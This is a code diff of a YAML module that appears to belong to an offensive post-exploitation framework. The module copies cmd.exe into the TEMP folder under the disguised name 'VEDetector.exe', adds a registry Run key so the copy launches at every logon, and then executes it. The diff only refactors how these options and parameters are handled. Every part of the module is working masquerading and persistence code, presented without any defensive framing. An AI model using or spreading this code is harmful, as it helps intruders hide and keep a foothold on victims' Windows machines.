@@ -23,23 +23,24 @@ comments:
 options:
   - name: SourceFile
     description: Path to the source binary.
-    required: false
+    required: true
     value: 'C:\Windows\System32\cmd.exe'
   - name: DestinationPath
     description: Directory to place the masqueraded binary.
-    required: false
+    required: true
     value: '$env:TEMP'
   - name: DestinationName
     description: New name for the masqueraded binary.
-    required: false
+    required: true
     value: 'VEDetector.exe'
   - name: AddRunKey
-    description: Add a registry Run key for persistence (true/false).
+    description: Add a registry Run key for persistence.
     required: false
-    value: 'true'
+    value: 'True'
+    strict: true
     suggested_values:
-      - 'true'
-      - 'false'
+      - 'True'
+      - 'False'
   - name: OutputFunction
     description: PowerShell output function to use.
     required: false
@@ -53,7 +54,7 @@ script: |
           [string]$SourceFile,
           [string]$DestinationPath,
           [string]$DestinationName,
-          [string]$AddRunKey = "true"
+          [switch]$AddRunKey
       )
 
       $destPath = $ExecutionContext.InvokeCommand.ExpandString($DestinationPath)
@@ -67,7 +68,7 @@ script: |
       Copy-Item -Path $SourceFile -Destination $destFile -Force
       Write-Output "[+] Copied $SourceFile to $destFile"
 
-      if ($AddRunKey.ToLower() -eq "true") {
+      if ($AddRunKey) {
           New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $DestinationName.Replace('.exe','') -Value $destFile -PropertyType String -Force | Out-Null
           Write-Output "[+] Added Run key: $($DestinationName.Replace('.exe','')) -> $destFile"
       }
@@ -82,6 +83,4 @@ script: |
           Write-Output "[-] Failed to execute: $_"
       }
   }
-script_end: Invoke-MasqueradeLocation -SourceFile "{{ SourceFile }}" -DestinationPath
-  "{{ DestinationPath }}" -DestinationName "{{ DestinationName }}" -AddRunKey "{{
-  AddRunKey }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
+script_end: Invoke-MasqueradeLocation {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
